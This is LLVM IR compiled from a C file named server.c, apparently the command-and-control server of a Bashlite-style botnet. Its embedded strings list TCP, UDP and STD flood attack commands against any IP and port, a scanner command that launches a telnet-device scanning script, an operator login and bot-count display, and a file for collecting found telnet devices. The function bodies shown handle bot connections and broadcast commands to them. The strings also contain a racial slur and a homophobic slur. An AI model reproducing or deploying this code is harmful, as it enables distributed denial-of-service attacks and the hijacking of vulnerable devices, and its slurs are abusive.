; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.account = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[31m> \1B[0m\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"DUP Client - Terminating\0A\00", align 1
@.str.8 = private unnamed_addr constant [12 x i8] c"!* GTFOFAG\0A\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"DUP\0A\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.11 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.12 = private unnamed_addr constant [12 x i8] c"!* FATCOCK\0A\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.15 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.16 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.17 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.20 = private unnamed_addr constant [52 x i8] c"%c]0;Bots connected: %d | Operators connected: %d%c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.21 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [10 x %struct.account] zeroinitializer, align 16
@.str.24 = private unnamed_addr constant [20 x i8] c"\1B[37mUsername:\1B[30m\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.26 = private unnamed_addr constant [20 x i8] c"\1B[37mPassword:\1B[30m\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.28 = private unnamed_addr constant [43 x i8] c"\1B[31m===================================\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [43 x i8] c"\1B[31m=          INVALID LOGIN          =\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [42 x i8] c"\1B[31m===================================\0A\00", align 1
@.str.31 = private unnamed_addr constant [40 x i8] c"      \1B[0;31mWelcome Nova Sex        \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [41 x i8] c"      \1B[0;31mHELP for Commands        \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [50 x i8] c"\1B[0;36m****************************************\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [58 x i8] c"\1B[0;36m****************************************\0D\0A\0D\0A> \1B[0m\00", align 1
@.str.35 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.36 = private unnamed_addr constant [41 x i8] c"Telnet devices: %d | Telnet status: %d\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.38 = private unnamed_addr constant [47 x i8] c"Bots connected: %d | Operators connected: %d\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [8 x i8] c"SCAN ON\00", align 1
@.str.40 = private unnamed_addr constant [27 x i8] c"python d.py 500 B 119.93 3\00", align 1
@.str.41 = private unnamed_addr constant [9 x i8] c"SCAN OFF\00", align 1
@.str.42 = private unnamed_addr constant [18 x i8] c"killall -9 python\00", align 1
@.str.43 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.44 = private unnamed_addr constant [63 x i8] c"\1B[0;36mAttack Methods---------------------------------------\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [57 x i8] c"\1B[0;36m!* TCP [IP] [PORT] [TIME] 32 all 0 1 -TCP FLOOD\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [53 x i8] c"\1B[0;36m!* UDP [IP] [PORT] [TIME] 32 0 1 -UDP FLOOD\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [46 x i8] c"\1B[0;36m!* STD [IP] [PORT] [TIME] -STD FLOOD\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [63 x i8] c"\1B[0;36mExtra Commands---------------------------------------\0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [40 x i8] c"\1B[0;36m!* KILLATTK -KILLS ALL ATTACKS\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [39 x i8] c"\1B[0;36mSCAN ON -TURNS THE SCANNER ON\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [35 x i8] c"\1B[0;36mBOTS -SHOW REAL BOT COUNT\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [42 x i8] c"\1B[0;36mSTATUS -SHOWS THE TELNET DEVICES\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [8 x i8] c".logout\00", align 1
@.str.54 = private unnamed_addr constant [12 x i8] c"\1B[31m> \1B[0m\00", align 1
@.str.55 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.56 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.58 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.59 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.60 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.61 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.62 = private unnamed_addr constant [66 x i8] c"\1B[37mPrivate file, if you have it, fuck you. Created By Void\1B[0m\0A\00", align 1
@.str.63 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.64 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.65 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.67 = private unnamed_addr constant [7 x i8] c"NIGGER\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.69 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.70 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.71 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %104, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %107

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 2
  %47 = load i8, i8* %46, align 1
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52, %49, %38
  br label %104

60:                                               ; preds = %52, %42
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %80

63:                                               ; preds = %60
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %80

70:                                               ; preds = %63
  %71 = load i32, i32* %12, align 4
  %72 = call i64 @send(i32 %71, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 5, i32 16384)
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %6, align 8
  %76 = call i64 @strlen(i8* %75) #8
  %77 = call i64 @send(i32 %73, i8* %74, i64 %76, i32 16384)
  %78 = load i32, i32* %12, align 4
  %79 = call i64 @send(i32 %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %80

80:                                               ; preds = %70, %63, %60
  %81 = load i32, i32* %12, align 4
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %81)
  %83 = load i32, i32* %12, align 4
  %84 = load i8*, i8** %4, align 8
  %85 = load i8*, i8** %4, align 8
  %86 = call i64 @strlen(i8* %85) #8
  %87 = call i64 @send(i32 %83, i8* %84, i64 %86, i32 16384)
  %88 = load i32, i32* %7, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %100

90:                                               ; preds = %80
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %92
  %94 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %100

97:                                               ; preds = %90
  %98 = load i32, i32* %12, align 4
  %99 = call i64 @send(i32 %98, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i64 13, i32 16384)
  br label %103

100:                                              ; preds = %90, %80
  %101 = load i32, i32* %12, align 4
  %102 = call i64 @send(i32 %101, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 1, i32 16384)
  br label %103

103:                                              ; preds = %100, %97
  br label %104

104:                                              ; preds = %103, %59
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %12, align 4
  br label %35, !llvm.loop !11

107:                                              ; preds = %35
  %108 = load i8*, i8** %8, align 8
  call void @free(i8* %108) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %307
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %304, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %307

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 2
  store i8 0, i8* %68, align 1
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %304

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %196

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %152, %159, %162, %186
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %195

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  br label %195

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 2
  %120 = load i8, i8* %119, align 1
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 4
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 4
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %165

147:                                              ; preds = %144
  %148 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0))
  %149 = load i32, i32* %10, align 4
  %150 = call i64 @send(i32 %149, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i64 11, i32 16384)
  %151 = icmp eq i64 %150, -1
  br i1 %151, label %152, label %155

152:                                              ; preds = %147
  %153 = load i32, i32* %10, align 4
  %154 = call i32 @close(i32 %153)
  br label %88

155:                                              ; preds = %147
  %156 = load i32, i32* %10, align 4
  %157 = call i64 @send(i32 %156, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0), i64 4, i32 16384)
  %158 = icmp eq i64 %157, -1
  br i1 %158, label %159, label %162
